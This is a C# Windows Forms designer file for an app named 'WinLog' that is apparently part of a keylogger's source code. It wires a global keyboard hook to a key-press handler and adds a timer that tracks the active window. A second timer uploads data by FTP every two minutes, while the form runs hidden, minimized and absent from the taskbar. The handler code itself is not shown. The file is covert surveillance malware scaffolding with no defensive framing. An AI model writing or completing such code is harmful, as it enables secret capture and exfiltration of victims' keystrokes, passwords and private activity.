namespace Logger
{
	partial class MainForm
	{
		/// <summary>
		/// Required designer variable.
		/// </summary>
		private System.ComponentModel.IContainer components = null;

		/// <summary>
		/// Clean up any resources being used.
		/// </summary>
		/// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
		protected override void Dispose(bool disposing)
		{
			if (disposing && (components != null))
			{
				components.Dispose();
			}
			base.Dispose(disposing);
		}

		#region Windows Form Designer generated code

		/// <summary>
		/// Required method for Designer support - do not modify
		/// the contents of this method with the code editor.
		/// </summary>
		private void InitializeComponent()
		{
			this.components = new System.ComponentModel.Container();
			this.mouseKeyEventProvider = new MouseKeyboardActivityMonitor.Controls.MouseKeyEventProvider();
			this.getWindowTimer = new System.Windows.Forms.Timer(this.components);
			this.uploadToFTP = new System.Windows.Forms.Timer(this.components);
			this.SuspendLayout();
			// 
			// mouseKeyEventProvider
			// 
			this.mouseKeyEventProvider.Enabled = true;
			this.mouseKeyEventProvider.HookType = MouseKeyboardActivityMonitor.Controls.HookType.Global;
			this.mouseKeyEventProvider.KeyPress += new System.Windows.Forms.KeyPressEventHandler(this.HookManager_KeyPress);
			// 
			// getWindowTimer
			// 
			this.getWindowTimer.Enabled = true;
			this.getWindowTimer.Tick += new System.EventHandler(this.GetWindowTimer_Tick);
			// 
			// uploadToFTP
			// 
			this.uploadToFTP.Enabled = true;
			this.uploadToFTP.Interval = 120000;
			this.uploadToFTP.Tick += new System.EventHandler(this.UploadToFTP_Tick);
			// 
			// MainForm
			// 
			this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
			this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
			this.ClientSize = new System.Drawing.Size(117, 64);
			this.MaximizeBox = false;
			this.MinimizeBox = false;
			this.Name = "MainForm";
			this.ShowIcon = false;
			this.ShowInTaskbar = false;
			this.Text = "WinLog";
			this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
			this.Load += new System.EventHandler(this.OnStart);
			this.ResumeLayout(false);

		}
		private System.Windows.Forms.Timer uploadToFTP;
		private System.Windows.Forms.Timer getWindowTimer;
		private MouseKeyboardActivityMonitor.Controls.MouseKeyEventProvider mouseKeyEventProvider;

		#endregion

	}
}

